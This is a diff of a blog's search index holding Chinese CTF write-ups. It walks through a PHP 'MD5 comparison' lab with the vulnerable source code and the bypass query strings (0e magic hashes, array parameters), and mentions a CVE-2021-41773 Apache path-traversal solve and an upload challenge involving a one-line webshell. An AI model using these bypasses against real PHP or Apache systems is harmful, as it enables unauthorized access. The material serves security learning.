+<p><img src="/2022/02/04/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/image-20220212192414635.png" alt="image-20220212192414635"></p>
+<p>这里的%2e是.的url编码，这里不能换成..  具体原因我也不太清楚，然后这里是在该位置下将内容输出到flag.txt文件中，结果为flag{This is CVE-2021-41773}</p>
+<h1 id="MD5-各种比较（实验室）"><a href="#MD5-各种比较（实验室）" class="headerlink" title="MD5 各种比较（实验室）"></a>MD5 各种比较（实验室）</h1><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./success.txt&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1</span></span><br><span class="line"><span class="variable">$val1</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>];</span><br><span class="line"><span class="variable">$val2</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val1</span> == <span class="variable">$val2</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val1 OR val2 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5(<span class="variable">$val1</span>) != md5(<span class="variable">$val2</span>) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 1 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;step 1 ok !!!&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解释出来就是val1和val2的值不等但是md5解析相同，<strong>因为处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</strong>这里<a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">参考</a></p>
+<p>构造<code>?val1=s878926199a&amp;val2=s155964671a</code>成功过第一步</p>
+<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 2</span></span><br><span class="line"><span class="variable">$thatfeelslike</span> = <span class="string">&quot;dcd385&quot;</span>;</span><br><span class="line"><span class="variable">$val3</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val3&#x27;</span>];</span><br><span class="line"><span class="variable">$val4</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val4&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$val3</span> == <span class="variable">$val4</span> || is_array(<span class="variable">$val3</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;val3 OR val4 no no no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( substr(md5(<span class="variable">$val3</span>),<span class="number">0</span>,<span class="number">6</span>) !== substr(md5(<span class="variable">$val4</span>),<span class="number">0</span>,<span class="number">6</span>) || <span class="variable">$thatfeelslike</span> !== substr(md5(<span class="variable">$val3</span>),<span class="number">0</span>,<span class="number">6</span>) )&#123;</span><br><span class="line">    <span class="comment">// echo substr(md5($val3),0,5);</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;step 2 fail&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;step 2 ok !!!&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>val3和val4不能相等，且val3不是数组，且val3和val4的md5加密前六位都是dcd385，我这里实在找不到。上网搜到了<a href="https://www.cnblogs.com/auzc/p/15845887.html">wp</a>，这里面提供了</p>
+<p>构造<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3=23902125&amp;val4=23027101</code></p>
+<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 3</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) === md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;step 3 ok !!! wuhu~~&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里是a和b的值不等，但是md5加密后却相等。因为这里是<code>===</code>不仅<strong>比较值相等还会比较值得类型是否相同</strong>0E在这里就不可用了。</p>
+<p><strong>php中md5和sha1函数都无法处理数组，会返回NULL</strong><br>所以构造<code>a[]=1&amp;&amp;b[]=2</code>就可以绕过。<a href="https://blog.csdn.net/john_lain/article/details/83478023">参考</a></p>
+<h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// step 4</span></span><br><span class="line">    <span class="variable">$val5</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val5&#x27;</span>];</span><br><span class="line">    <span class="variable">$val6</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val6&#x27;</span>];</span><br><span class="line">    <span class="variable">$val7</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;val7&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$val5</span>) === md5(<span class="variable">$val6</span>) &amp;&amp; md5(<span class="variable">$val6</span>) === md5(<span class="variable">$val7</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tql!ddw! 记录你的名字吧!&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span> =  @<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$name</span>)&gt;<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="string">&quot;./success.txt&quot;</span>,<span class="variable">$name</span>.PHP_EOL,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个不用搞了，没传值直接就ok</p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>刷题记录-1</title>
     <url>/2022/02/02/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="HCTF2018-WarmUp"><a href="#HCTF2018-WarmUp" class="headerlink" title="HCTF2018 WarmUp"></a>HCTF2018 WarmUp</h1><p>这道题还是挺有意思的，不过还没完全吃透，看着别人的WP勉强能看懂一点。</p>
 <p>按F12发现存在source.php，进入页面后发现源码</p>
@@ -2499,7 +2592,7 @@
       </tags>
   </entry>
   <entry>
-    <title>极客大挑战 2019上传</title>
+    <title>极客大挑战 2019Upload</title>
     <url>/2021/12/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019Upload/</url>
     <content><![CDATA[<p>该题为上传木马题</p>
 <p>进入题目后，上传一句话木马</p>
